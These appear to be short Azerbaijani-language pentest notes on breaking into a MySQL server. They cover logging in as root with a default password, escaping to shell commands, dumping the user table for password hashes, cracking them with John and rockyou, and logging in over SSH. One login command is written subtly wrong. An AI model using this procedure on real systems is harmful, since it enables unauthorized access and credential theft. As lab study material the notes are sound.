# nmap scani atiriq default port 3306 mysql portudur (deyisdirile biler ) amma budur 
# eger user root parol passwordd'dirsa
     mysql -u root  -h $ip  -p password
   # istifade edilecek toollar 
    evveline "system"   sonuna ise ( " ; " ) qoyulur ( " ; " deyilisi noqte,vergul)
  ## data bases baxmaq ucun 
     show databases;
#
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
#
    use mysql;
      show table
 #
 +---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| engine_cost               |
| event                     |
| func                      |
| general_log               |
| gtid_executed             |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| innodb_index_stats        |
| innodb_table_stats        |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| server_cost               |
| servers                   |
| slave_master_info         |
| slave_relay_log_info      |
| slave_worker_info         |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
#
## bir table icerisindeki melumatlarin hamisina baxmaq ucun istifade edeceyik (sql injection rast geleceyik)
## example
     select  * from user \G;
   ## userin hashini goturdukden sonra john ile runlayib parolu tapiriq 
       
        john hash --wordlist=/usr/share/wordlists/rockyou.txt 

   # userin adini ve parolu john ile qirdiqdan sonra ssh ile usere daxil oluruq     
        
